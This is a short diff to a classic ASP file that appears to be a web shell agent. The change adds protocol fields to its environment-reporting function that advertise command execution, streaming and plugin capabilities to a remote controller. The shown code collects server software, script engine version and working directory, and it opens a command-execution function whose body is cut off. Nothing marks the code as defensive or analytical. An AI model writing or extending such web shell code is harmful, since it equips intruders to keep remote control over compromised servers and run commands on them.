@@ -159,7 +159,7 @@ Function DoEnv()
   Dim cwd, ver
   cwd = DoCwd()
   ver = ScriptEngine() & " " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
-  DoEnv = "{""ok"":true,""data"":{""server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""web_server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""php_version"":""" & EscJson(ver) & """,""current_dir"":""" & EscJson(cwd) & """,""separator"":""\\""}}"
+  DoEnv = "{""ok"":true,""data"":{""server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""web_server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""php_version"":""" & EscJson(ver) & """,""current_dir"":""" & EscJson(cwd) & """,""separator"":""\\"",""info"":{""ProtoVersion"":""2"",""Capabilities"":""chunked,stream,plugin,exec"",""ShellType"":""file""}}}"
 End Function
 Function DoExec(c, w)
   On Error Resume Next
